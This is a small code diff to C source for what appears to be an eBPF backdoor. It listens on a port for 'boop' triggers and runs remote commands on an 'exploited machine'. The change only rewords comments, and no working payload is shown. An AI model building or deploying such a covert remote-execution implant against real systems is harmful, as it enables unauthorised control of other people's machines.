@@ -39,13 +39,13 @@
 
 #define VERSION "1.0.2"
 
-// PORT must match the ${SRC_PORT} in the /remote script!
+// PORT must match the ${SRC_PORT} in the /boop script!
 #define PORT 3535
 
 // MAX_DENY_ADDRS is the maximum amount of address that can be denied.
 #define MAX_DENY_ADDRS 1024
 
-// MAX_RCE_SIZE is the maximum size of a remote command to execute.
+// MAX_RCE_SIZE is the maximum size of a boop command to execute.
 #define MAX_RCE_SIZE 1024
 
 // PROBE_BOOP is the eBPF probe to listen for boops
@@ -79,7 +79,7 @@ void usage() {
 
 // handlerevrce will handle a reverse lookup against
 // a triggered event. This is responsible for
-// finding whatever remote command will need to
+// finding whatever boop command will need to
 // be executed on the bookit exploited machine.
 void handlerevrce(char dial[INET_ADDRSTRLEN], char *rce) {
   printf("  * Boop: %s\n ", dial);
